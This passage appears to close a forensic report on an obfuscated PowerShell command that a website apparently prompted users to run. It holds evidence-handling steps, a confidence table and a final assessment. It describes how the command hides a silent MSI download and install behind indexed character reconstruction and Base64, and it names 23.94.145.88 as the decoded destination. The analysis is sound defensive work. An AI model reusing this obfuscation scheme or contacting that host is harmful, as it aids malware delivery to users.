Assign evidence IDs, record collector, source system, acquisition time and timezone, original path, method, SHA-256 (where appropriate), and custody transfer. Keep original artifacts read-only; analyze copies. Capture exact line breaks, backslashes, quote marks, and text encoding. For process/network logs, note retention limits and whether command-line logging was enabled. Do not treat the absence of telemetry as evidence that no action occurred.

| Claim | Confidence | Basis |
|---|---|---|
| Index sequence reconstructs `C:\Windows\...\powershell.exe` | High | Reproducible offline index mapping |
| Base64 yields the printed PowerShell script | High | Reproducible UTF-16LE decoding |
| MSI retrieval was attempted on a real endpoint | Unknown | No endpoint process, error, or network logs |
| `392073560` denotes `23.94.145.88` as a 32-bit address | High for arithmetic; **not** for network use | Integer conversion only |
| MSI file existed or installed | Unknown | No file or installer evidence |
| Website used ClickFix | Unknown | No page capture or user interaction record |
| Payload family, persistence or data theft | Unknown | No MSI or post-execution telemetry |

## Further evidence needed to close the case

The most useful next artifacts are: exact original website page capture, affected-host process telemetry, the PowerShell/installer failure or success logs, recovered `o.msi` if any, and network transaction records. The article documents a **static decoded installation attempt**, not a proven infection chain.

## What cannot be concluded yet

This is **not** proof of a successful infection. The literal numeric destination has not been validated as a working URL. No MSI bytes were supplied, so there is no payload hash, malware-family identification, custom-action analysis, confirmed command-and-control behavior, or attribution. The original site presentation was not provided, so a specific ClickFix campaign cannot be confirmed.

To turn this static report into an incident report with a definitive outcome, the next evidence items are: the website URL and page capture, endpoint process logs around execution time, any downloaded `o.msi`, installer logs, and relevant network transactions.

## Final assessment

The original command reconstructs a syntactically plausible PowerShell invocation and is designed to hide an install chain in two layers: **indexed CMD character reconstruction** and **Base64-encoded PowerShell**. Its decoded instructions attempt to fetch `o.msi` and install it quietly through Windows Installer. That combination deserves high-priority investigation when associated with a website prompt.

The exact final impact remains **unknown until the MSI and endpoint evidence are examined**.
